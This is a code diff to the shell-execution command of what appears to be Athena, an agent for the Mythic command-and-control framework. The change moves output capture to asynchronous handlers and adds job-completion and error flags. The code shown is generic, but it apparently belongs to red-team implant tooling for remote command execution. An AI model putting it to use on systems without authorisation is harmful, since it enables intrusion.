@@ -1,5 +1,4 @@
 ﻿using Athena.Mythic.Model;
-
 using System;
 using System.Diagnostics;
 
@@ -7,22 +6,11 @@ namespace Athena.Commands
 {
     public class Execution
     {
-        public static string ShellExec (MythicTask task)
+        public static string ShellExec (MythicJob job)
         {
-            //https://stackoverflow.com/questions/5718473/c-sharp-processstartinfo-start-reading-output-but-with-a-timeout
-            //This may be why jobs don't call back when they return a lot of data.
-
-
-            //maybe do a while(!process.exited()){
-            //flush output
-            // something like that?
-
             Process process = new Process();
             string shell, output;
-            string parameters = task.parameters;
-
-            //Env shows current shell
-
+            string parameters = job.task.parameters;
             if (OperatingSystem.IsMacOS() || OperatingSystem.IsLinux())
             {
                 shell = Environment.GetEnvironmentVariable("SHELL");
@@ -57,17 +45,26 @@ namespace Athena.Commands
             };
             try
             {
+                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data != null) job.taskresult += errorLine.Data + Environment.NewLine;};
+                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data != null) job.taskresult += outputLine.Data + Environment.NewLine; job.hasoutput = true;};
                 process.Start();
+                process.BeginErrorReadLine();
+                process.BeginOutputReadLine();
                 process.WaitForExit();
+
                 if (process.ExitCode != 0)
                 {
-                    output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd();
+                    job.complete = true;
+                    job.hasoutput = true;
+                    job.errored = true;
+                    job.taskresult += "Process exited with code: " + process.ExitCode;
                 }
                 else
                 {
-                    output = process.StandardOutput.ReadToEnd();
+                    job.complete = true;
+                    job.hasoutput = true;
                 }
-                return output;
+                return null;
             }
             catch (Exception e)
             {
